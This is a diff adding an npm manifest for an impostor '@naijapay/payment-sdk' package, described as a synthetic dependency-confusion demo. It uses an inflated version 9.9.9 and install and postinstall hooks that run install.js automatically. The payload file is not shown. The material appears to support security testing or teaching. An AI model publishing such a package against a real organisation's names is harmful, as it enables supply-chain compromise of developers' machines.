@@ -1,0 +1,11 @@
+{
+  "name": "@naijapay/payment-sdk",
+  "version": "9.9.9",
+  "description": "Attacker-controlled impostor of @naijapay/payment-sdk published to a public/untrusted registry (synthetic dependency-confusion demo)",
+  "main": "install.js",
+  "publisher": "attacker",
+  "scripts": {
+    "install": "node install.js",
+    "postinstall": "node install.js"
+  }
+}
